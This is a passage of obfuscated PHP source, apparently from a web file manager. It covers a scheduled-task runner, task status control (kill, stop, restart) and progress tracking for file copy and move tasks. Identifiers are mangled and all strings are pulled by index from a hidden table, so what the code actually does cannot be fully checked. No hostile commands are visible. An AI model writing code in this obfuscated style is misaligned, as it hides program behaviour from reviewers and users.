$öÀÊƒÏñ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($öÀÊƒÏñ[1720] => $öÀÊƒÏñ[228], $öÀÊƒÏñ[821] => $öÀÊƒÏñ[91])); self::log($öÀÊƒÏñ[1737]); } public static function taskSwitch() { $ò³€Ì€œ =& $_SERVER[¢ñàß¿€]; $Ï¨ï«ğ = self::valueGet($ò³€Ì€œ[821]) == $ò³€Ì€œ[91] ? $ò³€Ì€œ[228] : $ò³€Ì€œ[91]; self::valueSet($ò³€Ì€œ[821], $Ï¨ï«ğ); } public static function shutdownEvent() { $—²èöşç =& $_SERVER[¢ñàß¿€]; self::valueSet($—²èöşç[1720], $—²èöşç[228]); self::log($—²èöşç[1738]); } public static function config($Ñœ›˜Éã, $ÍÙöì») { self::valueSet($_SERVER[¢ñàß¿€][821], $Ñœ›˜Éã); } private static function taskRunAll() { $®Ë“‘ï« =& $_SERVER[¢ñàß¿€]; $ó»ú­Ò„ = timeFloat(); $§å°÷è× = Model($®Ë“‘ï«[1739])->listData(); $½‚“í­ = count($§å°÷è×); for ($¥Ô¿¼ÚŞ = 0; $¥Ô¿¼ÚŞ < $½‚“í­; $¥Ô¿¼ÚŞ++) { $òä“Øá§ = $§å°÷è×[$¥Ô¿¼ÚŞ]; if (!$òä“Øá§[$®Ë“‘ï«[475]] || $òä“Øá§[$®Ë“‘ï«[1740]] != $®Ë“‘ï«[91]) { continue; } if (!self::taskTimeCheck($òä“Øá§)) { continue; } self::taskRun($òä“Øá§); } Hook::trigger($®Ë“‘ï«[1741]); self::taskQueueRun($ó»ú­Ò„); } private static function taskQueueRun($¡åØ½ï) { $úÀÏóŸµ = 10; while (!0) { $¾‘Œ½Ç = TaskQueue::run(); if ($¾‘Œ½Ç === !1) { break; } if (timeFloat() - $¡åØ½ï >= $úÀÏóŸµ) { break; } } } private static function taskTimeCheck($œÜ¼âÆç) { $¼ß¥—¼“ =& $_SERVER[¢ñàß¿€]; $÷ƒ¼ûÀ™ = json_decode($œÜ¼âÆç[$¼ß¥—¼“[206]], !0); $ªÕ‹ö£ = intval($œÜ¼âÆç[$¼ß¥—¼“[1721]]); $Éúòşç¿ = strtotime($¼ß¥—¼“[1742] . $÷ƒ¼ûÀ™[$¼ß¥—¼“[1743]] . $¼ß¥—¼“[1744]) - strtotime($¼ß¥—¼“[1745]); $¬¦­¢î = time() - strtotime(date($¼ß¥—¼“[1746]) . $¼ß¥—¼“[1747]); $ğ©·î­¸ = $¬¦­¢î >= $Éúòşç¿ && $¬¦­¢î <= $Éúòşç¿ + 3600; switch ($÷ƒ¼ûÀ™[$¼ß¥—¼“[33]]) { case $¼ß¥—¼“[1748]: if (time() - $ªÕ‹ö£ < 3600 * 24 * 30) { return !1; } if ($÷ƒ¼ûÀ™[$¼ß¥—¼“[1748]] == date($¼ß¥—¼“[1749]) && $ğ©·î­¸) { return !0; } break; case $¼ß¥—¼“[1750]: if (time() - $ªÕ‹ö£ < 3600 * 24 * 7) { return !1; } $øïïî­ = date($¼ß¥—¼“[1751]) == 0 ? 7 : date($¼ß¥—¼“[1751]); if ($÷ƒ¼ûÀ™[$¼ß¥—¼“[1750]] == $øïïî­ && $ğ©·î­¸) { return !0; } break; case $¼ß¥—¼“[1743]: if (time() - $ªÕ‹ö£ < 3600 * 24) { return !1; } if ($ğ©·î­¸) { return !0; } break; case $¼ß¥—¼“[1752]: if (time() - $ªÕ‹ö£ >= floatval($÷ƒ¼ûÀ™[$¼ß¥—¼“[1752]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Âëò‡® =& $_SERVER[¢ñàß¿€]; static $àÍÂ´¿á = 0; $ª†€œ€ƒ = 300; if (!$àÍÂ´¿á) { $àÍÂ´¿á = time(); } if (time() - $àÍÂ´¿á < $ª†€œ€ƒ) { return; } $àÍÂ´¿á = time(); $ıûˆ£ë¤ = Model($Âëò‡®[577])->db($Âëò‡®[12]); if ($ıûˆ£ë¤) { $ıûˆ£ë¤->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Âëò‡®[1753], $Âëò‡®[1754]); die; } } public static function taskRun($ĞÃ¾±¤‡) { $¯—ù‰ =& $_SERVER[¢ñàß¿€]; self::log($¯—ù‰[1755] . $ĞÃ¾±¤‡[$¯—ù‰[475]] . $¯—ù‰[1756] . $ĞÃ¾±¤‡[$¯—ù‰[32]] . $¯—ù‰[1757] . $ĞÃ¾±¤‡[$¯—ù‰[1758]]); Model($¯—ù‰[1739])->run($ĞÃ¾±¤‡[$¯—ù‰[475]]); $Ï§àÁœ® = timeFloat(); $ÍÆ¢¹Ğä = $¯—ù‰[12]; switch ($ĞÃ¾±¤‡[$¯—ù‰[33]]) { case $¯—ù‰[383]: $óèíîÙö = url_request($ĞÃ¾±¤‡[$¯—ù‰[1758]], $¯—ù‰[261], !1, !1, !1, !1, 10); if ($óèíîÙö[$¯—ù‰[821]]) { $ÍÆ¢¹Ğä = strlen($óèíîÙö[$¯—ù‰[1284]]); } break; case $¯—ù‰[260]: $ÍÆ¢¹Ğä = Hook::apply($ĞÃ¾±¤‡[$¯—ù‰[1758]]); default: break; } Model($¯—ù‰[1759])->add(array($¯—ù‰[1760] => $¯—ù‰[12], $¯—ù‰[1761] => $¯—ù‰[228], $¯—ù‰[33] => $¯—ù‰[1762] . $ĞÃ¾±¤‡[$¯—ù‰[475]], $¯—ù‰[1763] => json_encode(array($¯—ù‰[32] => $ĞÃ¾±¤‡[$¯—ù‰[32]], $¯—ù‰[1764] => timeFloat() - $Ï§àÁœ®, $¯—ù‰[369] => $ÍÆ¢¹Ğä)))); $«Ş¥ìÇÊ = $ÍÆ¢¹Ğä ? $¯—ù‰[1765] . $ÍÆ¢¹Ğä : $¯—ù‰[12]; self::log($¯—ù‰[1766] . $ĞÃ¾±¤‡[$¯—ù‰[475]] . $¯—ù‰[178] . $«Ş¥ìÇÊ); return !0; } public static function valueGet($±ÊÜàìØ) { $ÌÎùŞÈğ =& $_SERVER[¢ñàß¿€]; $‹íö×Ûò = $ÌÎùŞÈğ[1767]; $Ä­Ù× = Model($ÌÎùŞÈğ[508])->get($±ÊÜàìØ, $‹íö×Ûò); if (is_null($Ä­Ù×)) { Model($ÌÎùŞÈğ[508])->set($ÌÎùŞÈğ[821], $ÌÎùŞÈğ[91], $‹íö×Ûò); Model($ÌÎùŞÈğ[508])->set($ÌÎùŞÈğ[1720], $ÌÎùŞÈğ[228], $‹íö×Ûò); $Ä­Ù× = Model($ÌÎùŞÈğ[508])->get($±ÊÜàìØ, $‹íö×Ûò); } return $Ä­Ù×; } private static function valueSet($‡¹ÖãÈì, $…Ã Ç¾— = false) { $õŸäİÖ‰ =& $_SERVER[¢ñàß¿€]; $‡Ğ™€Ø³ = $õŸäİÖ‰[1768]; CacheLock::lock($‡Ğ™€Ø³); $ÎàË¤«³ = Model($õŸäİÖ‰[508])->set($‡¹ÖãÈì, $…Ã Ç¾—, $õŸäİÖ‰[1767]); CacheLock::unlock($‡Ğ™€Ø³); return $ÎàË¤«³; } protected static function log($ò¢÷ßà¨) { write_log($ò¢÷ßà¨, $_SERVER[¢ñàß¿€][1754]); } private static function cacheClear() { $ÁŞÒ¥Ô =& $_SERVER[¢ñàß¿€]; Cache::clearMemory(Model($ÁŞÒ¥Ô[508])->cacheKey($ÁŞÒ¥Ô[1767])); Cache::clearMemory(Model($ÁŞÒ¥Ô[508])->cacheKey($ÁŞÒ¥Ô[1769])); Model($ÁŞÒ¥Ô[1739])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ …¨ˆ¾×, $“†€İÈÙ = '', $Í¸—Êñ¤ = 0, $ì‘ÊÇ ® = '') { $Áî±Ç‚ß =& $_SERVER[¢ñàß¿€]; if (self::get($ …¨ˆ¾×)) { return; } $this->task = array($Áî±Ç‚ß[475] => $ …¨ˆ¾×, $Áî±Ç‚ß[1770] => USER_ID, $Áî±Ç‚ß[1659] => $ì‘ÊÇ ®, $Áî±Ç‚ß[526] => $Áî±Ç‚ß[12], $Áî±Ç‚ß[33] => $“†€İÈÙ, $Áî±Ç‚ß[1140] => $Áî±Ç‚ß[12], $Áî±Ç‚ß[1138] => $Í¸—Êñ¤, $Áî±Ç‚ß[1771] => 0, $Áî±Ç‚ß[1772] => 0, $Áî±Ç‚ß[1773] => 0, $Áî±Ç‚ß[1774] => timeFloat(), $Áî±Ç‚ß[1775] => 0, $Áî±Ç‚ß[1776] => 0, $Áî±Ç‚ß[1777] => 0, $Áî±Ç‚ß[1778] => 0, $Áî±Ç‚ß[821] => $Áî±Ç‚ß[1720]); $GLOBALS[$Áî±Ç‚ß[1779]] = 1; Hook::bind($Áî±Ç‚ß[1724], array($this, $Áî±Ç‚ß[1780])); Hook::bind($Áî±Ç‚ß[1781], array($this, $Áî±Ç‚ß[1782])); $this->startAfter(); Hook::trigger($Áî±Ç‚ß[1783], $this->task); $this->task[$Áî±Ç‚ß[1776]] = timeFloat(); } public function end($•œÀÜ¯ú = '') { $ò—ùÄÄÏ =& $_SERVER[¢ñàß¿€]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ò—ùÄÄÏ[1776]]) { self::valueSet($this->task[$ò—ùÄÄÏ[475]], !1); } $this->isEnd = !0; if ($•œÀÜ¯ú) { $this->task[$ò—ùÄÄÏ[526]] = $•œÀÜ¯ú; } self::log($ò—ùÄÄÏ[1784] . $this->task[$ò—ùÄÄÏ[475]] . $ò—ùÄÄÏ[1785] . sprintf($ò—ùÄÄÏ[921], timeFloat() - $this->task[$ò—ùÄÄÏ[1774]]) . $ò—ùÄÄÏ[1786]); Hook::unbind($ò—ùÄÄÏ[1724], array($this, $ò—ùÄÄÏ[1780])); Hook::unbind($ò—ùÄÄÏ[1781], array($this, $ò—ùÄÄÏ[1782])); $this->endAfter(); $ÔÁĞú© = $this->task; $this->task = !1; Hook::trigger($ò—ùÄÄÏ[1787], $ÔÁĞú©); } public function update($©‚¢ÉšÛ = 0, $ºùºÃ¢Ã = false) { $·°í´¬ş =& $_SERVER[¢ñàß¿€]; $ÈÙæ¾Ñ÷ =& $this->task; if (!$ÈÙæ¾Ñ÷) { return; } $ÈÙæ¾Ñ÷[$·°í´¬ş[1771]] += $©‚¢ÉšÛ; $ÈÙæ¾Ñ÷[$·°í´¬ş[1775]] = timeFloat(); if ($ÈÙæ¾Ñ÷[$·°í´¬ş[1138]]) { if ($ÈÙæ¾Ñ÷[$·°í´¬ş[1138]] < $ÈÙæ¾Ñ÷[$·°í´¬ş[1771]]) { $ÈÙæ¾Ñ÷[$·°í´¬ş[1138]] = $ÈÙæ¾Ñ÷[$·°í´¬ş[1771]]; } $ŒõªûÙ = timeFloat() - $ÈÙæ¾Ñ÷[$·°í´¬ş[1774]] - $ÈÙæ¾Ñ÷[$·°í´¬ş[1777]]; if ($ŒõªûÙ <= 0) { $ŒõªûÙ = 0.001; } $ÈÙæ¾Ñ÷[$·°í´¬ş[1772]] = $ÈÙæ¾Ñ÷[$·°í´¬ş[1771]] / $ÈÙæ¾Ñ÷[$·°í´¬ş[1138]]; $ÈÙæ¾Ñ÷[$·°í´¬ş[1773]] = $ÈÙæ¾Ñ÷[$·°í´¬ş[1771]] / $ŒõªûÙ; if ($ÈÙæ¾Ñ÷[$·°í´¬ş[1772]] > 0) { $ÈÙæ¾Ñ÷[$·°í´¬ş[1778]] = $ŒõªûÙ * (1 - $ÈÙæ¾Ñ÷[$·°í´¬ş[1772]]) / $ÈÙæ¾Ñ÷[$·°í´¬ş[1772]]; } $ÈÙæ¾Ñ÷[$·°í´¬ş[1778]] = $ÈÙæ¾Ñ÷[$·°í´¬ş[1778]] <= 0 ? 0 : $ÈÙæ¾Ñ÷[$·°í´¬ş[1778]]; } $this->updateAfter(); $ğäÑ·‚† = 0.2; if (timeFloat() - $ÈÙæ¾Ñ÷[$·°í´¬ş[1776]] < $ğäÑ·‚† && !$ºùºÃ¢Ã) { return; } $¸Ã°ö»š = self::get($ÈÙæ¾Ñ÷[$·°í´¬ş[475]]); $¤ºÓÍ×¹ = $¸Ã°ö»š[$·°í´¬ş[821]]; if ($¤ºÓÍ×¹ == self::STATYS_KILL) { $ß¯õşãš = array($·°í´¬ş[1788] => LNG($·°í´¬ş[1789]), $·°í´¬ş[1294] => !1); Cache::set($·°í´¬ş[1790] . $this->task[$·°í´¬ş[475]], $ß¯õşãš, 30); $this->onKill(); $this->end(); die; } else { if ($¤ºÓÍ×¹ == self::STATYS_STOP) { $†â“©šŞ = 2; $¸Ã°ö»š[$·°í´¬ş[1777]] += $†â“©šŞ; self::valueSet($ÈÙæ¾Ñ÷[$·°í´¬ş[475]], $¸Ã°ö»š); sleep($†â“©šŞ); $this->update(); return; } } $ÈÙæ¾Ñ÷[$·°í´¬ş[821]] = $¤ºÓÍ×¹ ? $¤ºÓÍ×¹ : $ÈÙæ¾Ñ÷[$·°í´¬ş[821]]; $ÈÙæ¾Ñ÷[$·°í´¬ş[1777]] = $¸Ã°ö»š[$·°í´¬ş[1777]] ? $¸Ã°ö»š[$·°í´¬ş[1777]] : 0; $ÈÙæ¾Ñ÷[$·°í´¬ş[1776]] = timeFloat(); Hook::trigger($·°í´¬ş[1791], $ÈÙæ¾Ñ÷); self::valueSet($ÈÙæ¾Ñ÷[$·°í´¬ş[475]], $ÈÙæ¾Ñ÷); } public function onKillSet($ÒÍĞı¡Ä, $Ï¨Àıéï = array()) { $this->onKillCall = array($ÒÍĞı¡Ä, $Ï¨Àıéï); } public function onKill() { $Ùªé¬§Ò =& $_SERVER[¢ñàß¿€]; self::log($Ùªé¬§Ò[1784] . $this->task[$Ùªé¬§Ò[475]] . $Ùªé¬§Ò[1792]); Hook::trigger($Ùªé¬§Ò[1793], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ãæº­¥÷) { $ØÔ×ÏéÄ =& $_SERVER[¢ñàß¿€]; Cache::set($ØÔ×ÏéÄ[1790] . $this->task[$ØÔ×ÏéÄ[475]], $ãæº­¥÷, 60); return $ãæº­¥÷; } public static function get($ÃäåÑìç) { $óé‘‡²Ö =& $_SERVER[¢ñàß¿€]; $ú×Î”ìï = self::valueGet($ÃäåÑìç); if (is_array($ú×Î”ìï) && $ú×Î”ìï[$óé‘‡²Ö[1794]]) { $¬ç€¯ˆê = ActionApply($ú×Î”ìï[$óé‘‡²Ö[1794]], array($ú×Î”ìï)); $ú×Î”ìï = is_array($¬ç€¯ˆê) ? $¬ç€¯ˆê : $ú×Î”ìï; } return $ú×Î”ìï; } public static function listData() { $­îŞÍ„ä = self::valueGet(); return array_sort_by($­îŞÍ„ä, $_SERVER[¢ñàß¿€][1774], !0); } public static function kill($³ë§ÂúÔ) { return self::changeStatus($³ë§ÂúÔ, self::STATYS_KILL); } public static function stop($ö¾¦–¼Ğ) { return self::changeStatus($ö¾¦–¼Ğ, self::STATYS_STOP); } public static function restart($”ôáÖéª) { return self::changeStatus($”ôáÖéª, self::STATYS_RUNNING); } public static function killAll() { $··øáÔÙ =& $_SERVER[¢ñàß¿€]; $Ó¥ÙÚ¹ä = self::listData(); foreach ($Ó¥ÙÚ¹ä as $Ùºï·Íâ) { self::kill($Ùºï·Íâ[$··øáÔÙ[475]]); } sleep(2); foreach ($Ó¥ÙÚ¹ä as $Ùºï·Íâ) { self::valueSet($Ùºï·Íâ[$··øáÔÙ[475]], !1); } } private static function changeStatus($Ûé¾¿“Ú, $€ùËç·ğ) { $”¹šÜ¼½ =& $_SERVER[¢ñàß¿€]; $–ƒÏã— = self::valueGet($Ûé¾¿“Ú); if (!$–ƒÏã—) { return !1; } $–ƒÏã—[$”¹šÜ¼½[821]] = $€ùËç·ğ; self::valueSet($Ûé¾¿“Ú, $–ƒÏã—); self::log($”¹šÜ¼½[1795] . $–ƒÏã—[$”¹šÜ¼½[475]] . $”¹šÜ¼½[1796] . $€ùËç·ğ); return !0; } public static function valueGet($ÌåàÍÒö = false) { $ïöö›î =& $_SERVER[¢ñàß¿€]; if ($ÌåàÍÒö) { $Å‹ğğ• = Model($ïöö›î[520])->where(array($ïöö›î[97] => $ÌåàÍÒö, $ïöö›î[33] => $ïöö›î[1147]))->find(); return $Å‹ğğ• ? json_decode($Å‹ğğ•[$ïöö›î[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($®Áº¹şà = false) { $ã×……í =& $_SERVER[¢ñàß¿€]; $±¾±‘ïó = array($ã×……í[33] => $ã×……í[1147]); if ($®Áº¹şà) { $±¾±‘ïó[$ã×……í[1770]] = $®Áº¹şà; } $ö¤›şÅå = Model($ã×……í[520])->where($±¾±‘ïó)->select(); $ö¤›şÅå = $ö¤›şÅå ? $ö¤›şÅå : array(); foreach ($ö¤›şÅå as $“İ¡º™Æ => $Šõë’Œ) { $ö¤›şÅå[$“İ¡º™Æ] = json_decode($Šõë’Œ[$ã×……í[450]], !0); } return $ö¤›şÅå; } public static function valueSet($¿å§À¼, $òïÖñ) { $¢­ßßÑ¶ =& $_SERVER[¢ñàß¿€]; if (!$òïÖñ) { return Model($¢­ßßÑ¶[520])->where(array($¢­ßßÑ¶[97] => $¿å§À¼, $¢­ßßÑ¶[33] => $¢­ßßÑ¶[1147]))->delete(); } $—ä³ÄÕ = json_encode($òïÖñ); if (!$—ä³ÄÕ) { ob_start(); var_dump($òïÖñ); $“®ï·øà = ob_get_clean(); self::log($¢­ßßÑ¶[1797] . json_encode_force($“®ï·øà)); } if (!$¿å§À¼ || !$òïÖñ[$¢­ßßÑ¶[475]]) { return !1; } $´Î ğ«¿ = array($¢­ßßÑ¶[33] => $¢­ßßÑ¶[1147], $¢­ßßÑ¶[1770] => USER_ID, $¢­ßßÑ¶[97] => $¿å§À¼, $¢­ßßÑ¶[450] => $—ä³ÄÕ); $Ë¹ÔŒƒŞ = $¢­ßßÑ¶[1798]; CacheLock::lock($Ë¹ÔŒƒŞ); Model($¢­ßßÑ¶[520])->add($´Î ğ«¿, array(), !0); CacheLock::unlock($Ë¹ÔŒƒŞ); } public static function log($ƒää‡Æ›) { if (!GLOBAL_DEBUG) { return; } write_log($ƒää‡Æ›, $_SERVER[¢ñàß¿€][1799]); } } class TaskFileTransfer extends Task { protected function startAfter() { $©ö¬—­‰ =& $_SERVER[¢ñàß¿€]; $¤÷Ôë © =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($©ö¬—­‰[1800], array($this, $©ö¬—­‰[1801])); Hook::bind($©ö¬—­‰[1305], array($this, $©ö¬—­‰[1802])); Hook::bind($©ö¬—­‰[1803], array($this, $©ö¬—­‰[1804])); Hook::bind($©ö¬—­‰[668], array($this, $©ö¬—­‰[1805])); Hook::bind($©ö¬—­‰[669], array($this, $©ö¬—­‰[1806])); Hook::bind($©ö¬—­‰[675], array($this, $©ö¬—­‰[1807])); Hook::bind($©ö¬—­‰[676], array($this, $©ö¬—­‰[1808])); Hook::bind($©ö¬—­‰[671], array($this, $©ö¬—­‰[1809])); Hook::bind($©ö¬—­‰[673], array($this, $©ö¬—­‰[1810])); Hook::bind($©ö¬—­‰[637], array($this, $©ö¬—­‰[1811])); Hook::bind($©ö¬—­‰[634], array($this, $©ö¬—­‰[1811])); Hook::bind($©ö¬—­‰[639], array($this, $©ö¬—­‰[1811])); Hook::bind($©ö¬—­‰[641], array($this, $©ö¬—­‰[1811])); Hook::bind($©ö¬—­‰[643], array($this, $©ö¬—­‰[1811])); Hook::bind($©ö¬—­‰[1812], array($this, $©ö¬—­‰[1813])); Hook::bind($©ö¬—­‰[659], array($this, $©ö¬—­‰[1814])); $this->sourceModelCopyFlag = !1; Hook::bind($©ö¬—­‰[1815], array($this, $©ö¬—­‰[1816])); Hook::bind($©ö¬—­‰[1817], array($this, $©ö¬—­‰[1818])); Hook::bind($©ö¬—­‰[1819], array($this, $©ö¬—­‰[1820])); $¤÷Ôë ©[$©ö¬—­‰[1821]] = LNG($©ö¬—­‰[1822]); $¤÷Ôë ©[$©ö¬—­‰[1823]] = 0; $¤÷Ôë ©[$©ö¬—­‰[1824]] = 0; $¤÷Ôë ©[$©ö¬—­‰[1140]] = $©ö¬—­‰[12]; $¤÷Ôë ©[$©ö¬—­‰[1825]] = $©ö¬—­‰[12]; $¤÷Ôë ©[$©ö¬—­‰[1826]] = 0; $¤÷Ôë ©[$©ö¬—­‰[1827]] = 0; $¤÷Ôë ©[$©ö¬—­‰[1828]] = 0; if (!$¤÷Ôë ©[$©ö¬—­‰[1659]]) { $¤÷Ôë ©[$©ö¬—­‰[1659]] = LNG($©ö¬—­‰[1829]); } } protected function endAfter() { $Å÷—¥è• =& $_SERVER[¢ñàß¿€]; Hook::unbind($Å÷—¥è•[1800], array($this, $Å÷—¥è•[1801])); Hook::unbind($Å÷—¥è•[1305], array($this, $Å÷—¥è•[1802])); Hook::unbind($Å÷—¥è•[1803], array($this, $Å÷—¥è•[1804])); Hook::unbind($Å÷—¥è•[668], array($this, $Å÷—¥è•[1805])); Hook::unbind($Å÷—¥è•[669], array($this, $Å÷—¥è•[1806])); Hook::unbind($Å÷—¥è•[675], array($this, $Å÷—¥è•[1807])); Hook::unbind($Å÷—¥è•[676], array($this, $Å÷—¥è•[1808])); Hook::unbind($Å÷—¥è•[671], array($this, $Å÷—¥è•[1809])); Hook::unbind($Å÷—¥è•[673], array($this, $Å÷—¥è•[1810])); Hook::unbind($Å÷—¥è•[637], array($this, $Å÷—¥è•[1811])); Hook::unbind($Å÷—¥è•[634], array($this, $Å÷—¥è•[1811])); Hook::unbind($Å÷—¥è•[639], array($this, $Å÷—¥è•[1811])); Hook::unbind($Å÷—¥è•[641], array($this, $Å÷—¥è•[1811])); Hook::unbind($Å÷—¥è•[643], array($this, $Å÷—¥è•[1811])); Hook::unbind($Å÷—¥è•[1812], array($this, $Å÷—¥è•[1813])); Hook::unbind($Å÷—¥è•[659], array($this, $Å÷—¥è•[1814])); Hook::unbind($Å÷—¥è•[1815], array($this, $Å÷—¥è•[1816])); Hook::unbind($Å÷—¥è•[1817], array($this, $Å÷—¥è•[1818])); Hook::unbind($Å÷—¥è•[1819], array($this, $Å÷—¥è•[1820])); } public function copyMoveStart($ãßêÛ…‰, $‡‚˜‰Î, $×¥ˆË«, $É“¹Í×ñ) { $òÏûÉµŸ =& $_SERVER[¢ñàß¿€]; self::log($òÏûÉµŸ[1830] . $‡‚˜‰Î . $òÏûÉµŸ[73] . $É“¹Í×ñ); $Ş½€™®å = rtrim(TEMP_FILES, $òÏûÉµŸ[8]); if (substr($‡‚˜‰Î, 0, strlen($Ş½€™®å)) == $Ş½€™®å) { return; } if (substr($É“¹Í×ñ, 0, strlen($Ş½€™®å)) == $Ş½€™®å) { return; } $”ÚŒ•‚Í =& $this->task; $”ÚŒ•‚Í[$òÏûÉµŸ[1831]] = KodIO::transferType($ãßêÛ…‰, $×¥ˆË«); $this->update(); } public function updateAfter() { $‰ˆêÒÑÌ =& $_SERVER[¢ñàß¿€]; $ÑÑĞçŞî =& $this->task; if (!$ÑÑĞçŞî[$‰ˆêÒÑÌ[834]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÑÑĞçŞî[$‰ˆêÒÑÌ[1831]] == $‰ˆêÒÑÌ[1398]) { return; } self::updateTask($ÑÑĞçŞî); } private static function updateTask(&$ş¿’©ü«) { $÷•ƒŞ´Ò =& $_SERVER[¢ñàß¿€]; if ($ş¿’©ü«[$÷•ƒŞ´Ò[1831]] == $÷•ƒŞ´Ò[1276] || $ş¿’©ü«[$÷•ƒŞ´Ò[1831]] == $÷•ƒŞ´Ò[110]) { if ($ş¿’©ü«[$÷•ƒŞ´Ò[1825]]) { $ş¿’©ü«[$÷•ƒŞ´Ò[1828]] = $ş¿’©ü«[$÷•ƒŞ´Ò[1827]] + $ş¿’©ü«[$÷•ƒŞ´Ò[1824]]; } } else { if ($ş¿’©ü«[$÷•ƒŞ´Ò[1831]] == $÷•ƒŞ´Ò[1399]) { if ($ş¿’©ü«[$÷•ƒŞ´Ò[1825]] == $÷•ƒŞ´Ò[1276]) { $ş¿’©ü«[$÷•ƒŞ´Ò[1828]] = $ş¿’©ü«[$÷•ƒŞ´Ò[1827]] + $ş¿’©ü«[$÷•ƒŞ´Ò[1824]] * 0.5; } else { if ($ş¿’©ü«[$÷•ƒŞ´Ò[1825]] == $÷•ƒŞ´Ò[110]) { $ş¿’©ü«[$÷•ƒŞ´Ò[1828]] = $ş¿’©ü«[$÷•ƒŞ´Ò[1827]] + $ş¿’©ü«[$÷•ƒŞ´Ò[1823]] * 0.5 + $ş¿’©ü«[$÷•ƒŞ´Ò[1824]] * 0.5; } } } } $ş¿’©ü«[$÷•ƒŞ´Ò[1772]] = $ş¿’©ü«[$÷•ƒŞ´Ò[1828]] / $ş¿’©ü«[$÷•ƒŞ´Ò[834]]; if ($ş¿’©ü«[$÷•ƒŞ´Ò[1772]] > 0) { $ñŸşà«° = timeFloat() - $ş¿’©ü«[$÷•ƒŞ´Ò[1774]] - $ş¿’©ü«[$÷•ƒŞ´Ò[1777]]; $ş¿’©ü«[$÷•ƒŞ´Ò[1778]] = $ñŸşà«° * (1 - $ş¿’©ü«[$÷•ƒŞ´Ò[1772]]) / $ş¿’©ü«[$÷•ƒŞ´Ò[1772]]; } } public function addPath($û¥üã›) { $”ş„˜¾Ì =& $_SERVER[¢ñàß¿€]; if (!$û¥üã›) { return; } $ƒ½¼µ¦à =& $this->task; $ŠÎ€å¨ = IO::infoWithChildren($û¥üã›); $×Úêõ¿Á = $ƒ½¼µ¦à[$”ş„˜¾Ì[1832]] ? $ƒ½¼µ¦à[$”ş„˜¾Ì[1832]][$”ş„˜¾Ì[1833]] : 0; $ƒ½¼µ¦à[$”ş„˜¾Ì[1832]] = array($”ş„˜¾Ì[1833] => $×Úêõ¿Á + 1, $”ş„˜¾Ì[494] => $ŠÎ€å¨[$”ş„˜¾Ì[32]], $”ş„˜¾Ì[87] => $ŠÎ€å¨[$”ş„˜¾Ì[87]], $”ş„˜¾Ì[582] => $ŠÎ€å¨[$”ş„˜¾Ì[582]] ? $ŠÎ€å¨[$”ş„˜¾Ì[582]] : $ŠÎ€å¨[$”ş„˜¾Ì[87]]); if ($ŠÎ€å¨[$”ş„˜¾Ì[33]] == $”ş„˜¾Ì[230]) { $ƒ½¼µ¦à[$”ş„˜¾Ì[1138]] += 1; } else { $ƒ½¼µ¦à[$”ş„˜¾Ì[1138]] += $ŠÎ€å¨[$”ş„˜¾Ì[82]][$”ş„˜¾Ì[80]]; if ($ŠÎ€å¨[$”ş„˜¾Ì[193]]) { $ƒ½¼µ¦à[$”ş„˜¾Ì[1138]] += $ŠÎ€å¨[$”ş„˜¾Ì[82]][$”ş„˜¾Ì[81]] + 1; } } $ƒ½¼µ¦à[$”ş„˜¾Ì[834]] += $ŠÎ€å¨[$”ş„˜¾Ì[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($°üÇ¨–Ç) { } public function sourceAddHashEnd($¤ŞåãÔ) { } public function sourceAddFileStart($´ñ×•©) { $ÍéÉ„µÑ =& $_SERVER[¢ñàß¿€]; $àÀ÷øÎî =& $this->task; $àÀ÷øÎî[$ÍéÉ„µÑ[1823]] = $´ñ×•©[$ÍéÉ„µÑ[79]]; $àÀ÷øÎî[$ÍéÉ„µÑ[1821]] = $´ñ×•©[$ÍéÉ„µÑ[32]]; $àÀ÷øÎî[$ÍéÉ„µÑ[1140]] = $´ñ×•©[$ÍéÉ„µÑ[32]]; $àÀ÷øÎî[$ÍéÉ„µÑ[1834]] = $´ñ×•©[$ÍéÉ„µÑ[87]]; $this->update(); } public function sourceAddFileEnd($€×ıò¶˜) { $¾µˆ³á¨ =& $_SERVER[¢ñàß¿€]; $îÅ˜í»ï =& $this->task; $îÅ˜í»ï[$¾µˆ³á¨[1828]] += $€×ıò¶˜[$¾µˆ³á¨[79]]; $îÅ˜í»ï[$¾µˆ³á¨[1834]] = $€×ıò¶˜[$¾µˆ³á¨[87]]; $this->update(1); } public function copyFileStart($»ß±±ú, $öÜ‘ù¨Ğ, $Á”½Ù™ı, $ñôËü–•, $‰Ïì£ß, $Ä¼¬ñ±„) { $ØÆ’¬İ =& $_SERVER[¢ñàß¿€]; $±¼÷™ã = $‰Ïì£ß; if ($±¼÷™ã == $GLOBALS[$ØÆ’¬İ[1835]]) { $±¼÷™ã = $GLOBALS[$ØÆ’¬İ[1836]]; } $GLOBALS[$ØÆ’¬İ[1836]] = $‰Ïì£ß; $GLOBALS[$ØÆ’¬İ[1835]] = $Ä¼¬ñ±„; $ĞÒ´áèİ =& $this->task; $ĞÒ´áèİ[$ØÆ’¬İ[1821]] = $±¼÷™ã; $ĞÒ´áèİ[$ØÆ’¬İ[1823]] = (int) $»ß±±ú->size($öÜ‘ù¨Ğ); $ĞÒ´áèİ[$ØÆ’¬İ[1824]] = 0; $ĞÒ´áèİ[$ØÆ’¬İ[1140]] = $ØÆ’¬İ[12]; $ĞÒ´áèİ[$ØÆ’¬İ[1825]] = $ØÆ’¬İ[12]; $ĞÒ´áèİ[$ØÆ’¬İ[1826]] = 0; $›ÄæõÙ¦ = $ĞÒ´áèİ[$ØÆ’¬İ[1823]] > 1024 * 1024 * 10 ? !0 : !1; 